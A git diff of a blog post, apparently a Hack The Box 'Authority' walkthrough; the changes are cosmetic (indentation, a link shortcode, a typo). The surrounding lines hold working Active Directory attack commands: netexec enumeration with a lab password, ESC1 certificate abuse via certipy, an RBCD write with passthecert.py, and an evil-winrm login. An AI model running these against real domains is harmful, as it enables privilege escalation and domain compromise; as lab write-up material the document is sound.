@@ -555,8 +555,8 @@ sudo responder -I tun0
 ![Pasted image 20250226164410.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226164410.png?raw=true)
 - I can exploit this by adding a computer and requesting a certificate for `upn:` `administrator` 
 ### Abusing ESC1:
-	- I have to enumerate for computers, The setting that allows a user to add a computer to the domain is the `ms-ds-machineaccountquota`
-	- The same we have done earlier in [[2.4-Support]]  box. I can enumerate for this using `netexec` using module `maq` 
+- I have to enumerate for computers, The setting that allows a user to add a computer to the domain is the `ms-ds-machineaccountquota`
+- The same we have done earlier in {{< article link="/posts/1741895312886-support-walkthrough-htb/" showSummary=true compactSummary=true >}} box. I can enumerate for this using `netexec` using module `maq` 
 ```bash
 netexec ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
 ```
@@ -590,7 +590,7 @@ certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt
 ![Pasted image 20250226170337.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226170337.png?raw=true)
 - Now I can give `write_rbcd` permission to my computer using the certificate and key of user `administrator`
 - *RBCD: RBCD allows a _service_ (running on a computer account) to impersonate users _only to specific other services_ on _other_ computers. Unlike traditional constrained delegation (which specifies _who_ can delegate _to_ a service), RBCD focuses on _which services a computer can access_ on behalf of users. The key is the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object.*
-- This tool [passthecert](wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py) made this attack easy for me . Using this tool I assigned RBCD permission to `Emp5r0R$`.
+- This tool [passthecert](https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py) made this attack easy for me . Using this tool I assigned RBCD permission to `Emp5r0R$`.
 ```bash
 python3 passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'Emp5r0R$' -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222
 ```
@@ -660,6 +660,6 @@ AUTHORITY$:des-cbc-md5:ef4c23d5e9bfea4a
 - Logged in using `evil-winrm` and got the root flag
 ![Pasted image 20250226215544.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226215544.png?raw=true)
 
-{{< typeit >}} I know it's been long since my last post, The resason is Hugo had an recently which caused some issues within my site build. Anyway This is a very good box, I learnt a lot. I'll see you guys again like old times with regular posts, bye. {{< /typeit >}}
+{{< typeit >}} I know it's been long since my last post, The resason is Hugo had an update recently which caused some issues within my site build. Anyway This is a very good box, I learnt a lot. I'll see you guys again like old times with regular posts, bye. {{< /typeit >}}
 
 ![bye](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExb3ZjdjQxcnB0YXBqYXV0NnA0dzI4YWoxeTJidm1jNWpxaWhtZGxsMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/fNqodJNdEUrP65RYDT/giphy.gif)
